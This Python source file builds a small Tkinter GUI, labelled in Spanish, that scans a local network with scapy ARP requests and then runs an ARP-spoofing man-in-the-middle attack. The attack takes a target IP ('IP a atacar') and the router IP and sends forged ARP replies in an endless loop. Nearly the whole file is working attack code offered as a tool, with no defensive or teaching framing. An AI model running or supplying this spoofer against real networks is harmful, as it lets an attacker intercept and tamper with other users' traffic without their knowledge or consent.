from tkinter import *
import scapy.all as scapy

def ventanaCapturaDatos():
    def devolverDatos(texto):
        def scan(ip):
            clients_list = []
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
            arp_request_broadcast = broadcast/arp_request
            respond_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]

            for x in respond_list:
                clients_list += [{"ip": x[1].psrc, "mac": x[1].hwsrc}]
            return clients_list

        def print_results(clients_list):
            regreso = 'IP:\t\t\t\tMAC ADDRESS:\n'
            for x in clients_list:
                regreso+=f"{x['ip']}\t\t\t{x['mac']}\n"
            return regreso
        scan_result = scan(texto)
        print(print_results(scan_result))
        return print_results(scan_result)

    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast/arp_request
        x= 0
        while x!=1:
            try:
                respond_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
                return respond_list[0][1].hwsrc
            except:
                x=0

    def spoof(target_ip, router_ip):
        for x in range(5):
            target_mac = get_mac(target_ip)
        x = 0

        while True:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
            scapy.send(packet, verbose=False)
            packet = scapy.ARP(op=2, pdst=router_ip, hwdst=target_mac, psrc=target_ip)
            scapy.send(packet, verbose=False)
            print(f'[+] Haciendote pasar por: {texto2.get()}\n[+] Engañando a: {texto3.get()}\n[+] {x} Paquetes enviados')
            arpspoofing.configure(text=f'[+] Haciendote pasar por: {texto2.get()}\n[+] Engañando a: {texto3.get()}\n[+] {x} Paquetes enviados')
            root.update()
            x += 2

    global root
    root = Tk()
    root.title("Ventana para scanear la red")
    root.geometry('1000x400')

    net_scan = Frame(root)
    net_scan.config(bg='aqua',width="100",height="100")
    net_scan.pack()
    global ip_macs
    ip_macs = Label(root, text = 'Aquí se mostrará el escaneo', font=('calibre',10, 'bold'), bg='#4DF8D1')
    ip_macs.pack()
    send_spoof = Frame(root, relief="solid")
    send_spoof.config(bg='aqua',width="50",height="50")
    send_spoof.pack()
    global arpspoofing
    arpspoofing = Label(root, text = 'Aquí se muestran los paquetes mandados', font=('calibre',10, 'bold'), bg='#4DF8D1')
    arpspoofing.pack()

    def actualizar_paquetes(texto2,texto3):
            spoof(texto2.get(), texto3.get())
            spoof(texto3.get(), texto2.get())

    def actualizar_macs(ip_macs):
        ip_macs.configure(text=devolverDatos(texto.get()))
        root.update()

    texto = StringVar()
    texto2 = StringVar()
    texto3 = StringVar()   

    text_ip_label = Label(net_scan, text = 'Dirección ip:', font=('calibre',10, 'bold'))
    text_ip_label.grid(row = 0, column = 0, padx = 5, pady = 5)
    entryTexto = Entry(net_scan,textvariable = texto)
    entryTexto.grid(row = 0, column = 1, padx = 5, pady = 5)
    botonAceptar1 = Button(net_scan, text = "Escanear", command = lambda:actualizar_macs(ip_macs))
    botonAceptar1.grid(row = 0, column = 2, sticky = "e", padx = 5, pady = 5)

    target_ip = Label(send_spoof, text = 'IP a atacar:', font=('calibre',10, 'bold'))
    target_ip.grid(row = 0, column = 0, padx = 5, pady = 5)
    target_ip_text = Entry(send_spoof, textvariable = texto2)
    target_ip_text.grid(row = 0, column = 1, padx = 5, pady = 5)
    router_ip = Label(send_spoof, text = 'Ip del router:', font=('calibre',10, 'bold'))
    router_ip.grid(row = 0, column = 2, padx = 5, pady = 5)
    router_ip_text = Entry(send_spoof, textvariable = texto3)
    router_ip_text.grid(row = 0, column = 3, padx = 5, pady = 5)
    botonAceptar1 = Button(send_spoof, text = "MITM", command = lambda:actualizar_paquetes(texto2,texto3))
    botonAceptar1.grid(row = 0, column = 4, sticky = "e", padx = 5, pady = 5)

    root.mainloop()

texto = ventanaCapturaDatos()